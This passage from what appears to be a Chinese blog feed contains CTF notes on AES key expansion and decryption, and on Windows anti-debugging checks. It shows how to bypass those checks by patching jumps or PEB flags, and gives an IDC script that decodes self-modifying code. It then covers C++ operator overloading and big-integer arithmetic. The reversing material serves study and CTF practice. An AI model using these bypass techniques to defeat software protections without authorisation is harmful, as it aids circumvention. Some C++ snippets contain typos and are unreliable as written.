class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">G_Function</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>(*ExtendKeyArray)[<span class="number">44</span>], <span class="type">unsigned</span> <span class="type">int</span> nCol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//1、将扩展密钥矩阵的nCol-1列复制到nCol列上，并将nCol列第一行的元素移动到最后一行，其他行数上移一行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ExtendKeyArray[i][nCol] = ExtendKeyArray[(i + <span class="number">1</span>) % <span class="number">4</span>][nCol - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2、将nCol列进行S盒替换</span></span><br><span class="line">    <span class="built_in">Key_S_Substitution</span>(ExtendKeyArray, nCol);</span><br><span class="line">    <span class="comment">//3、将该列第一行元素与Rcon进行异或运算</span></span><br><span class="line">    ExtendKeyArray[<span class="number">0</span>][nCol] ^= Rcon[nCol / <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CalculateExtendKeyArray</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>(*PasswordArray)[<span class="number">4</span>], <span class="type">unsigned</span> <span class="type">char</span>(*ExtendKeyArray)[<span class="number">44</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//1、将密钥数组放入前四列扩展密钥组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ExtendKeyArray[i &amp; <span class="number">0x03</span>][i &gt;&gt; <span class="number">2</span>] = PasswordArray[i &amp; <span class="number">0x03</span>][i &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2、计算扩展矩阵的后四十列</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">11</span>; i++) <span class="comment">//进行十轮循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//(1)如果列号是4的倍数，这执行G函数 否则将nCol-1列复制到nCol列上</span></span><br><span class="line">        <span class="built_in">G_Function</span>(ExtendKeyArray, <span class="number">4</span>*i);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//(2)每一轮中，各列进行异或运算</span></span><br><span class="line">        <span class="comment">// 列号是4的倍数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)<span class="comment">//行号</span></span><br><span class="line">        &#123;</span><br><span class="line">        ExtendKeyArray[k][<span class="number">4</span> * i] = ExtendKeyArray[k][<span class="number">4</span> * i] ^ ExtendKeyArray[k][<span class="number">4</span> * (i - <span class="number">1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 其他三列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)<span class="comment">//每一轮的列号</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)<span class="comment">//行号</span></span><br><span class="line">            &#123;</span><br><span class="line">            ExtendKeyArray[k][<span class="number">4</span> * i + j] = ExtendKeyArray[k][<span class="number">4</span> * i + j - <span class="number">1</span>] ^ ExtendKeyArray[k][<span class="number">4</span> * (i - <span class="number">1</span>) + j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="AES解密"   >          <a href="#AES解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h3>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159157.png" alt="image-20230112180401282"></p><p>脚本建议直接使用py的第三方库</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">key = long_to_bytes(<span class="number">0xcb8d493521b47a4cc1ae7e62229266ce</span>)</span><br><span class="line">mi = long_to_bytes(<span class="number">0xbc0aadc0147c5ecce0b140bc9c51d52b46b2b9434de5324bad7fb4b39cdb4b5b</span>)</span><br><span class="line">lun = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line">flag = lun.decrypt(mi)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反调试技术</title>
      <link href="/2022/07/02/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/07/02/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[        <h1 id="反调试技术"   >          <a href="#反调试技术" class="heading-link"><i class="fas fa-link"></i></a><a href="#反调试技术" class="headerlink" title="反调试技术"></a>反调试技术</h1>      <p>反调试技术用于防止程序被调试</p><p>一般分为利用函数进行检测或者直接将调试权限清0</p>        <h2 id="IsDebuggerPresent"   >          <a href="#IsDebuggerPresent" class="heading-link"><i class="fas fa-link"></i></a><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h2>              <h3 id="原理"   >          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h3>      <p>IsDebuggerPresent是Windows API提供的函数，用于确定调用进程是否由用户模式调试器进行调试。</p><p>当调试器存在时, IsDebuggerPresent( )函数返回的是一个<code>非0值</code>.</p><p>API获取<code>PEB.BeingDebugged</code>的值来判断是否处于被调试状态。进程处于被调试状态时，PEB.BeingDebugged的值被设置为1，反之为0.</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">IsDebuggerPresent</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></div></figure><p>样例代码</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">IsDebuggerPresent</span>())&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call IsDebuggerPresent</span><br><span class="line">test al al</span><br><span class="line">jz </span><br><span class="line">call exit</span><br></pre></td></tr></table></div></figure>        <h3 id="绕过"   >          <a href="#绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159362.png" alt="image-20220710150918570"></p><p>如图，为一个<code>IsDebuggerPresent()</code>函数，如果正在被调试就会返回非零值</p><p>查看汇编</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159562.png" alt="image-20220710151048558"></p><p>若返回值为非零值</p><p>方法一：</p><p>修改jnz 指令为jz指令</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159375.png" alt="image-20220710152444126"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132201985.png" alt="image-20220710152514507"></p><p>绕过成功</p><p>方法二：</p><p>利用OD修改PEB.BeingDebugged 改为0.</p><p>PEB的结构指针存储在TEB中，fs:[0x30]是PEB fs:[0x18]是TEB。</p>        <h2 id="CheckRemoteDebuggerPresent"   >          <a href="#CheckRemoteDebuggerPresent" class="heading-link"><i class="fas fa-link"></i></a><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h2>              <h3 id="原理-1"   >          <a href="#原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3>      <p>CheckRemoteDebuggerPresent是Windows API提供的函数，用于检测是否正在调试指定的进程</p><p>于IsDebuggerPresent不同，它可以在多线程的情况下进行使用</p>        <h1 id="NtQueryInformationProcess"   >          <a href="#NtQueryInformationProcess" class="heading-link"><i class="fas fa-link"></i></a><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h1>              <h3 id="原理-2"   >          <a href="#原理-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3>      <p>NtQueryInformationProcess( )是一个接受一个信息类的参数用于查询的函数。</p><p>kernel32的<code>CheckRemoteDebuggerPresent()</code>函数内部通过调用<code>NtQueryInformationProcess()</code>来</p><p>检测调试, 而<code>NtQueryInformationProcess</code>内部则是查询<code>EPROCESS</code>结构体的<code>DebugPort</code>字段, 当进</p><p>程正在被调试时, 返回值为0xffffffff.</p>        <h2 id="TLS反调试"   >          <a href="#TLS反调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#TLS反调试" class="headerlink" title="TLS反调试"></a>TLS反调试</h2>      <p>TLS原本是用于多线程情况下的数据同步，分动态绑定和静态绑定两种用法</p><p>而其中的静态绑定可用于反调试</p>        <h3 id="TLS变量"   >          <a href="#TLS变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#TLS变量" class="headerlink" title="TLS变量"></a>TLS变量</h3>      <p>同一个线程里面调用的各个函数都可以访问、但其他线程无法访问的变量（被称为static memory local to a thread 线程局部静态变量）</p><p>因此，如果将</p>        <h3 id="TLS回调函数"   >          <a href="#TLS回调函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3>      <p>静态绑定反调试主要体现在回调函数中</p><p>程序可以提供<strong>一个或多个</strong>TLS回调函数，以支持TLS数据对象的附加初始化和终止</p><p>尽管通常只有一个回调函数，但回调函数是作为<strong>数组</strong>实现的，以便在需要时可以添加额外的回调函数</p><p>如果有多个回调函数，则<strong>按其地址在数组中出现的顺序</strong>调用每个函数。<strong>空指针终止数组</strong>。空列表是完全有效的(不支持回调)，在这种情况下，回调数组只有一个成员—— null ptr（空指针）</p><p>线程结束时会调用回调函数</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">tls_callback</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;</span><br><span class="line">    BOOL ret;</span><br><span class="line">    <span class="built_in">CheckRemoteDebuggerPresent</span>(<span class="built_in">GetCurrentProcess</span>(), &amp;ret);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="绕过-1"   >          <a href="#绕过-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3>      <p>修改ret的值</p><p>如果回调函数里面的不是强制退出的话就直接静态分析</p>        <h2 id="花指令"   >          <a href="#花指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2>      <p>所谓花指令，是指在程序中完全冗余，不影响程序功能却会对逆向工程产生干扰的指令。</p>        <h3 id="不可执行花指令"   >          <a href="#不可执行花指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#不可执行花指令" class="headerlink" title="不可执行花指令"></a>不可执行花指令</h3>      <p>例如</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132200631.png" alt="image-20220704201213135"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0040102C                 jnz     short near ptr loc_40102E+1</span><br><span class="line">.text:0040102E</span><br><span class="line">.text:0040102E loc_40102E:                             ; CODE XREF: .text:0040102C↑j</span><br><span class="line">.text:0040102E                 call    near ptr 0EC85D78Bh</span><br></pre></td></tr></table></div></figure><p>这段汇编用jnz指令往后面跳了一行，由于IDA用的是递归下降反汇编算法，会错误识别然后导致无法反汇编，并且后面的代码以数据块的方式展现出来</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132200349.png" alt="image-20220704201425907"></p><p>只能将花指令nop掉，让IDA从数据块开头开始执行递归下降反汇编</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132200476.png" alt="image-20220704201525487"></p><p>再把反汇编出来的指令定义为函数，即可正常的反汇编</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132200863.png" alt="image-20220704201701582"></p><p>当然也可以用OD进行修改</p>        <h3 id="可执行花指令"   >          <a href="#可执行花指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#可执行花指令" class="headerlink" title="可执行花指令"></a>可执行花指令</h3>              <h2 id="SMC-self-Modifying-Code"   >          <a href="#SMC-self-Modifying-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#SMC-self-Modifying-Code" class="headerlink" title="SMC(self-Modifying Code)"></a>SMC(self-Modifying Code)</h2>      <p>SMC(self-Modifying Code),就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=%E5%AD%97%E8%8A%82%E7%A0%81&spm=1001.2101.3001.7020" >字节码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。</p><p>示例</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132200060.png" alt="image-20220902151957943"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132200236.png" alt="image-20220902151933185"></p><p>程序执行的时候先将数据块解码再执行</p><p>选择使用idc脚本进行处理</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x402219</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>解码后再手动定义函数进行反汇编</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>运算符重载</title>
      <link href="/2022/06/24/%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/"/>
      <url>/2022/06/24/%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[        <h1 id="运算符重载"   >          <a href="#运算符重载" class="heading-link"><i class="fas fa-link"></i></a><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h1>      <p>运算符重载用于拓展运算符的作用对象至任意对象</p>        <h2 id="一元运算符（！，）"   >          <a href="#一元运算符（！，）" class="heading-link"><i class="fas fa-link"></i></a><a href="#一元运算符（！，）" class="headerlink" title="一元运算符（！，）"></a>一元运算符（！，）</h2>              <h3 id="负号"   >          <a href="#负号" class="heading-link"><i class="fas fa-link"></i></a><a href="#负号" class="headerlink" title="-[负号]"></a>-[负号]</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BIG <span class="keyword">operator</span> - ()  </span><br><span class="line">&#123;</span><br><span class="line">    BIG c;</span><br><span class="line">    c.x = -x;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="二元运算符（-，-，-x2F-）"   >          <a href="#二元运算符（-，-，-x2F-）" class="heading-link"><i class="fas fa-link"></i></a><a href="#二元运算符（-，-，-x2F-）" class="headerlink" title="二元运算符（-，*，&#x2F;）"></a>二元运算符（-，*，&#x2F;）</h2>      <p>注意顺序</p><h3 id=""><a href="#" class="headerlink" title="+"></a>+</h3><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BIG <span class="keyword">operator</span> + (<span class="type">const</span> BIG &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Box c;</span><br><span class="line">    c.x = x + b.x;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="赋值运算符"   >          <a href="#赋值运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2>              <h3 id="x3D"   >          <a href="#x3D" class="heading-link"><i class="fas fa-link"></i></a><a href="#x3D" class="headerlink" title="&#x3D;"></a>&#x3D;</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="keyword">operator</span> = (<span class="type">const</span> BIG &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    x = b.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="输入-x2F-输出运算符"   >          <a href="#输入-x2F-输出运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入-x2F-输出运算符" class="headerlink" title="输入&#x2F;输出运算符"></a>输入&#x2F;输出运算符</h2>              <h3 id="lt-lt"   >          <a href="#lt-lt" class="heading-link"><i class="fas fa-link"></i></a><a href="#lt-lt" class="headerlink" title="&lt;&lt;"></a>&lt;&lt;</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span> &lt;&lt; ( ostream &amp;out, <span class="type">const</span> BIG &amp;p )                                 </span><br><span class="line">&#123; </span><br><span class="line">    out &lt;&lt; p.x:</span><br><span class="line">    <span class="keyword">return</span> out;            </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="gt-gt"   >          <a href="#gt-gt" class="heading-link"><i class="fas fa-link"></i></a><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">friend</span> istream &amp;<span class="keyword">operator</span> &gt;&gt; ( istream &amp;in, BIG &amp;p )</span><br><span class="line">&#123; </span><br><span class="line">    in &gt;&gt; p.x;</span><br><span class="line">    <span class="keyword">return</span> in;            </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="递增递减运算符"   >          <a href="#递增递减运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#递增递减运算符" class="headerlink" title="递增递减运算符"></a>递增递减运算符</h2>              <h3 id="A"   >          <a href="#A" class="heading-link"><i class="fas fa-link"></i></a><a href="#A" class="headerlink" title="++A"></a>++A</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BIG <span class="keyword">operator</span> ++ ()  </span><br><span class="line">&#123;</span><br><span class="line">    BIG c;</span><br><span class="line">    x++;<span class="comment">//先加加</span></span><br><span class="line">    c.x = x;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="A-1"   >          <a href="#A-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-1" class="headerlink" title="A++"></a>A++</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BIG <span class="keyword">operator</span> ++ ( <span class="type">int</span> )         </span><br><span class="line">&#123;</span><br><span class="line">BIG c;<span class="comment">//保留原来的值</span></span><br><span class="line">    c.x = x;</span><br><span class="line">    x++;<span class="comment">//加加</span></span><br><span class="line"><span class="keyword">return</span> c;<span class="comment">//返回原来值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="类型转换运算符"   >          <a href="#类型转换运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#类型转换运算符" class="headerlink" title="类型转换运算符"></a>类型转换运算符</h2>              <h3 id="类型"   >          <a href="#类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#类型" class="headerlink" title="(类型)"></a>(类型)</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">char</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    c = a + <span class="string">&#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高精度运算</title>
      <link href="/2022/05/23/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97/"/>
      <url>/2022/05/23/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[        <h1 id="高精度运算"   >          <a href="#高精度运算" class="heading-link"><i class="fas fa-link"></i></a><a href="#高精度运算" class="headerlink" title="高精度运算"></a>高精度运算</h1>      <p>利用数组来模拟每一位的加减乘除法，具体分为高精对高精和高精对低精</p><p>利用运算符重载来简化使用</p>        <h2 id="输入输出"   >          <a href="#输入输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2>      <p>倒序读入并且第一位存放长度，方便后续的计算和比较</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> t[<span class="number">10010</span>];</span><br><span class="line"><span class="type">int</span> a[<span class="number">10010</span>];</span><br><span class="line">    <span class="built_in">BIG_INT</span>()&#123;<span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));&#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t);</span><br><span class="line">        a[<span class="number">0</span>] = <span class="built_in">strlen</span>(t);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; a[<span class="number">0</span>]; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = a[<span class="number">0</span>] - i;</span><br><span class="line">            a[j] = t[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = a[<span class="number">0</span>]; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">            cout &lt;&lt; a[i];</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="四则运算"   >          <a href="#四则运算" class="heading-link"><i class="fas fa-link"></i></a><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h2>              <h3 id="加法"   >          <a href="#加法" class="heading-link"><i class="fas fa-link"></i></a><a href="#加法" class="headerlink" title="加法"></a>加法</h3>              <h3 id="减法"   >          <a href="#减法" class="heading-link"><i class="fas fa-link"></i></a><a href="#减法" class="headerlink" title="减法"></a>减法</h3>              <h3 id="乘法（高精对低精）"   >          <a href="#乘法（高精对低精）" class="heading-link"><i class="fas fa-link"></i></a><a href="#乘法（高精对低精）" class="headerlink" title="乘法（高精对低精）"></a>乘法（高精对低精）</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BIG_INT <span class="keyword">operator</span> * (<span class="type">const</span> <span class="type">int</span> &amp;b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        BIG_INT C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= a[<span class="number">0</span>] || t; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &lt;= a[<span class="number">0</span>]) t += a[i] * b;</span><br><span class="line">            C.a[++C.a[<span class="number">0</span>]] = t % <span class="number">10</span>;</span><br><span class="line">            t /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(C.a[<span class="number">0</span>] &gt; <span class="number">1</span> &amp;&amp; C.a[C.a[<span class="number">0</span>]] == <span class="number">0</span>) C.a[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="乘法（高精对高精）"   >          <a href="#乘法（高精对高精）" class="heading-link"><i class="fas fa-link"></i></a><a href="#乘法（高精对高精）" class="headerlink" title="乘法（高精对高精）"></a>乘法（高精对高精）</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 